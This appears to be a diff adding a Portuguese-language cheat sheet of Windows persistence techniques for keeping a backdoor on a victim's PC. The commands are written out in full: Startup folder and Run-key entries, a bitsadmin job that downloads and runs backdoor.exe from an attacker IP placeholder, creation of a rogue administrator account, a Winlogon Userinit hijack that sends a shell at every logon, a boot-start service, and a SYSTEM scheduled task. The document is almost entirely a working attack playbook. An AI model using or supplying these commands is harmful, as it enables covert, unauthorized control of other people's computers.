@@ -1,0 +1,61 @@
+=============================================USER NORMAL========================================================
+##Via StartUp
+C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup    #Colar Backdoor nesta pasta
+
+
+##Via Registro
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Users\<USER>\AppData\Roaming\backdoor.exe"    #Mover o backdoor até C:\Users\<USER>\Appdata\Roaming e executar o comando
+
+
+
+## BITS ( Background Intelligent Transfer Service) é usado para transferência de arquivos entre máquinas (download ou upload) usando largura de banda de rede ociosa.
+##Via Bitsadmin
+bitsadmin /create backdoor  #criando serviço
+bitsadmin /addfile backdoor "http://(<SEU IP>)/backdoor.exe" "C:\Users\<USER>\<PATH DO BACKDOOR NO PC DA VITMIA>" #adicionando caminho e destino, pois o bits sempre requer origem e destino em seus serviços
+bitsadmin /SetNotifyCmdLine backdoor cmd.exe "/c bitsadmin.exe /complete backdoor | start /B C\Users\<USER>\<PATH DO BACKDOOR NO PC DA VITMIA>" #setando que é para ele iniciar
+bitsadmin /SetMinRetryDelay 30 #setando delay
+bitsadmin /resume backdoor  #startando o serviço
+
+
+
+=============================================USER ADMIN========================================================
+##Criando um usuário Administrativo (Óbvio qu)
+net user /add <USER> <PASSWORD>  #Podemos criar um novo usuário com privs administrativos
+net localgroup Administrators <USER> /add  #Adicionando ao grupo de administradores
+net localgroup Administrators #Listar os usuários do grupo para confirmar se nosso usuário está lá
+
+##Via Registro
+reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d "Userinit.exe, C:\Users\<USER>\<PATH DO BACKDOOR NO PC DA VITMIA>" /f  #Persistir via registro desta vez como admin, toda vez que um usuário logar nossa shell será enviada
+
+#Via Powershell(Modo simples, com serviço no caso)
+New-Service -Name "<SERVICE_NAME>" -BinaryPathName "<PATH_TO_BINARY>" -Description "<SERVICE_DESCRIPTION>" -StartupType "Boot"      # Via PowerShell
+
+
+
+
+## O Powershell pode ser usado para criar uma tarefa agendada e garantir a persistência, mas para isso, teremos que definir vários cmdlets. Esses são:
+
+## 1- New-ScheduledTaskAction
+## 2- New-ScheduledTaskTrigger
+## 3- New-ScheduledTaskPrincipal
+## 4- New-ScheduledTaskSettingsSet
+## 5- Register-ScheduledTask
+
+## New-ScheduledTaskAction - É usado para definir a ação que será realizada.
+## New-ScheduledTaskTrigger - Definindo o gatilho (diário / semanal / mensal, etc). O gatilho pode ser considerado uma condição que, quando cumprida, a tarefa agendada iniciará a ação.
+## New-ScheduledTaskPrincipal - é o usuário com o qual a tarefa será executada.
+## New-ScheduledTaskSettingsSet - Isso definirá nossas configurações mencionadas acima.
+## Register-ScheduledTask - criará a tarefa.
+
+
+## Comandos
+##Via PowerShell 2(Modo mais complexo, porém é mais eficaz também)
+PS > $A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\Users\<USER>\<PATH DO BACKDOOR NO PC DA VITMIA>"
+PS > $B = New-ScheduledTaskTrigger -AtLogOn
+PS > $C = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -RunLevel Highest
+PS > $D = New-ScheduledTaskSettingsSet
+PS > $E = New-ScheduledTask -Action $A -Trigger $B -Principal $C -Settings $D
+PS > Register-ScheduledTask Backdoor -InputObject $E
+
+
+
